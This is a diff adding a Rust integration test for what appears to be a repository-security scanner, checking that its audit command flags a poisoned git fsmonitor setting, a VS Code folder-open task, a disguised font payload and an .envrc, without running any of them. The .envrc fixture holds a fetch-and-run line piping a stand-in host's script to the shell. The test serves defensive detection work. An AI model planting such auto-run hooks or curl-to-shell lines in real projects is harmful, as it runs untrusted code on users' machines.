@@ -664,3 +664,45 @@ fn own_local_rewrites_are_not_reported() {
     assert!(finding(&v, "t10.ref-rewritten").is_none(), "{:#?}", rules(&v));
     assert!(finding(&v, "t11.rewritten-copy").is_none(), "{:#?}", rules(&v));
 }
+
+// ---- Phase 5: audit / clone / checkout ----
+
+/// A repository that "arrived as files": poisoned .git/config plus an
+/// uncommitted auto-run task and payload in the working tree.
+fn arrived_as_files() -> Fixture {
+    let f = fx::clean_fast_forward();
+    let cfg = f.local.join(".git/config");
+    let mut text = std::fs::read_to_string(&cfg).unwrap();
+    text.push_str(&format!("[core]\n\tfsmonitor = \"touch {}\"\n", f.marker.display()));
+    std::fs::write(&cfg, text).unwrap();
+    fx::write(&f.local, ".vscode/tasks.json", fx::tasks_json_payload());
+    fx::write(&f.local, "public/fonts/fa-solid-600.ttf", fx::fake_font_payload());
+    f
+}
+
+#[test]
+fn audit_reports_files_and_git_config_without_running_anything() {
+    let f = arrived_as_files();
+    let out = shield(&f).args(["audit", "--json"]).output().unwrap();
+    let v: Value =
+        serde_json::from_slice(&out.stdout).unwrap_or_else(|_| panic!("{}", String::from_utf8_lossy(&out.stderr)));
+    assert_eq!(out.status.code(), Some(2), "{:#?}", rules(&v));
+    assert!(has(&v, "git.local-config", "critical", false), "{:#?}", rules(&v));
+    assert!(has(&v, "vscode.tasks.folder-open", "critical", false), "{:#?}", rules(&v));
+    assert!(has(&v, "t13.payload-wired", "critical", false), "{:#?}", rules(&v));
+    assert!(!f.marker_exists(), "fsmonitor ran!");
+
+    // The committed tree is clean apart from the config.
+    let out = shield(&f).args(["audit", "--rev", "HEAD", "--json"]).output().unwrap();
+    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
+    assert!(finding(&v, "vscode.tasks.folder-open").is_none());
+    assert!(has(&v, "git.local-config", "critical", false));
+
+    // A plain folder (no git) works too.
+    let plain = f.dir.path().join("plain");
+    fx::write(&plain, ".envrc", "curl -fsSL https://x.example/i | sh\n");
+    let out = shield(&f).args(["audit", plain.to_str().unwrap(), "--json"]).output().unwrap();
+    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
+    assert!(has(&v, "t6.envrc", "critical", false), "{:#?}", rules(&v));
+    assert!(!f.marker_exists());
+}
